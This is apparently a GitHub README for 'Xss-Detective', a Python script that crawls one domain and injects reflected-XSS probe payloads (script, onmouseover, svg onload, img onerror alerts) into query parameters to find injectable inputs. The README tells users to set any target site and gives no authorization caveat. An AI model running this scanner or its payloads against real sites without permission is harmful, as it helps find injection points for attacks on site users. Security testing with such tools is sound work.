

![Ekran görüntüsü 2024-06-12 175233](https://github.com/hikmet444/Xss-Detective/assets/155376275/63c06f08-da8e-4aa3-b8af-ae42221eae45)

>usage

- **mkdir NewXSS**

 
 * **touch Xss-Detective**



+ **nano Xss-Detective**

>paste the code into the file

```

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from collections import deque


class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    ORANGE = '\033[93m'
    BOLD_RED = '\033[1;91m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

visited_urls = set()
url_queue = deque()

xss_payloads = [
    '<script>alert(1)</script>',
    '" onmouseover="alert(1)"',
    "' onmouseover=\"alert(1)\"",
    '"><svg/onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
]

validation_chars = ["<", ">", '"', "'"]
test_tags = ["<img>", "<script>", "<svg>"]

def is_vulnerable(response_text, payload):
    return payload in response_text

def test_validation_chars(url, param, char):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    query_params[param] = char
    new_query = urlencode(query_params, doseq=True)
    new_url = parsed_url._replace(query=new_query).geturl()

    try:
        response = requests.get(new_url, timeout=10)  # Timeout ekledim
        if response.status_code == 200 and is_vulnerable(response.text, char):
            print(f"{Colors.ORANGE}Validation char accepted: {new_url} with {char}{Colors.RESET}")
            return True
    except requests.RequestException as e:
        print(f"Error: {e}")
    print(f"{Colors.RED}Validation char not accepted: {new_url} with {char}{Colors.RESET}")
    return False

def test_html_tags(url, param, tag):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    query_params[param] = tag
    new_query = urlencode(query_params, doseq=True)
    new_url = parsed_url._replace(query=new_query).geturl()

    try:
        response = requests.get(new_url, timeout=10)  # Timeout ekledim
        if response.status_code == 200 and is_vulnerable(response.text, tag):
            print(f"{Colors.GREEN}HTML tag accepted: {new_url} with {tag}{Colors.RESET}")
            return True
    except requests.RequestException as e:
        print(f"Error: {e}")
    print(f"{Colors.RED}HTML tag not accepted: {new_url} with {tag}{Colors.RESET}")
    return False

def test_xss_payloads(url, param, payload):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    query_params[param] = payload
    new_query = urlencode(query_params, doseq=True)
    new_url = parsed_url._replace(query=new_query).geturl()

    try:
        response = requests.get(new_url, timeout=10)  # Timeout ekledim
        if response.status_code == 200 and is_vulnerable(response.text, payload):
            print(f"{Colors.GREEN}XSS payload accepted: {new_url} with {payload}{Colors.RESET}")
            return True
    except requests.RequestException as e:
        print(f"Error: {e}")
    print(f"{Colors.RED}XSS payload not accepted: {new_url} with {payload}{Colors.RESET}")
    return False

def find_xss_vulnerable_params(url):
    parsed_url = urlparse(url)
    if parsed_url.query:
        params = parsed_url.query.split('&')
        for param in params:
            key = param.split('=')[0]
            for char in validation_chars:
                if test_validation_chars(url, key, char):
                    break
            for tag in test_tags:
                if test_html_tags(url, key, tag):
                    break
            for payload in xss_payloads:
                if test_xss_payloads(url, key, payload):
                    break

def extract_links(url, domain):
    try:
        response = requests.get(url, timeout=10)  # Timeout ekledim
        soup = BeautifulSoup(response.text, 'html.parser')
        links = soup.find_all('a', href=True)

        for link in links:
            href = link.get('href')
            full_url = urljoin(url, href)
            if urlparse(full_url).netloc == domain and full_url not in visited_urls:
                url_queue.append(full_url)
    except requests.RequestException as e:
        print(f"Error: {e}")

def main(start_url):
    domain = urlparse(start_url).netloc
    print(r"""
██╗  ██╗███████╗███████╗    ██████╗ ███████╗████████╗███████╗ ██████╗████████╗██╗██╗   ██╗███████╗
╚██╗██╔╝██╔════╝██╔════╝    ██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██║██║   ██║██╔════╝
 ╚███╔╝ ███████╗███████╗    ██║  ██║█████╗     ██║   █████╗  ██║        ██║   ██║██║   ██║█████╗  
 ██╔██╗ ╚════██║╚════██║    ██║  ██║██╔══╝     ██║   ██╔══╝  ██║        ██║   ██║╚██╗ ██╔╝██╔══╝  
██╔╝ ██╗███████║███████║    ██████╔╝███████╗   ██║   ███████╗╚██████╗   ██║   ██║ ╚████╔╝ ███████╗
╚═╝  ╚═╝╚══════╝╚══════╝    ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝

                                                                                                                           
    """)
    print(f"{Colors.ORANGE}Starting scan: {start_url}{Colors.RESET}")
    url_queue.append(start_url)

    while url_queue:
        current_url = url_queue.popleft()
        if current_url in visited_urls:
            continue

        print(f"{Colors.ORANGE}Scanning: {current_url}{Colors.RESET}")
        visited_urls.add(current_url)

        find_xss_vulnerable_params(current_url)
        extract_links(current_url, domain)

if __name__ == "__main__":
    main("https://www.example.com")
                                     

```
>Before running, open the file with the nano command and write the website you want instead of example.com at the end
```
    main("http://testphp.vulnweb.com")

```
![Ekran görüntüsü 2024-06-12 180212](https://github.com/hikmet444/Xss-Detective/assets/155376275/e7cc3ea8-60e1-45fb-aee0-f053a6720d01)


python3 Xss-Detective

